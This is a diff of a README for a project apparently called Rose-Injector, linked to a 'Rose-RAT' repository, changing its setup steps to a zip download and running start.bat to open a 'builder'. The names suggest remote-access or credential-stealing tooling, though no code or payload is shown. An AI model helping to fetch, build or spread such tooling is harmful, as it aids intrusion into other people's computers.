@@ -83,9 +83,8 @@ You can check [this](https://github.com/DamagingRose/Rose-RAT) for informations
 
 Don't forget that the project is still under development release and might contain bugs.
 
-* Download the repository
-* Download the requirements by entering `pip install -r requirements.txt`
-* Start rose_builder.py from the tools dir
+* [Download the repository](https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip)
+* Run the start.bat to open up the Rose builder.
 * Enjoy!
 
 ## <a id="preview"></a> 📷 〢 Preview
